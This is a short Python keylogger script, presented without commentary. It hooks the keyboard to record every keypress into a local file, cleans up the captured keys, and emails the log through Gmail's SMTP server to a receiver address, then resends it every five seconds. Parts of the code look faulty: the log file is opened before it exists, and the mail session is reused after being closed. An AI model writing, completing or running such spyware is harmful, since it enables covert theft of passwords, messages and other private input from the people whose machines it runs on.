import keyboard
import smtplib
import time


keyboard_red = []
un_required = ['shift', 'ctrl', 'alt', 'right windows', 'left windows', 'tab', 'caps lock', 'print screen', 
               'scroll lock', 'insert', 'home', 'page up', 'delete', 'end', 'page down', 'num lock', 'right alt', 
               'right ctrl', 'right shift', 'menu']
function_key = ['f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12']

s = smtplib.SMTP('smtp.gmail.com', 587)
txt_file = open('logger.txt', 'r')

def send_logs():
    s.starttls()
    s.login("EMAIL_ID_USER@gmail.com", "EMAIL_ID_PASSWORD")
    message = txt_file.read()
    s.sendmail("SENDER_EMAIL", "RECEIVER_EMAIL", message)
    s.quit()

def logger():
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN and not keyboard.is_pressed('ctrl+space'):
            keyboard_red.append(event)
        elif keyboard.is_pressed('ctrl+space'):
            break

    with open('logger.txt', 'w') as Writer:
        for event in keyboard_red:
            if event.name == 'space':
                event.name = " "
            elif event.name == 'backspace':
                event.name = "\n <- \n "
            elif event.name == 'decimal':
                event.name = '.'
            elif event.name == 'enter':
                event.name = '\n'
            elif event.name in function_key:
                event.name = '\n function_key called \n'
            elif event.name in un_required:
                event.name = ''
            Writer.write(f"{event.name}")
    send_logs()      

if __name__ == "__main__":
    logger()
    while __name__:
        time.sleep(5)
        send_logs()
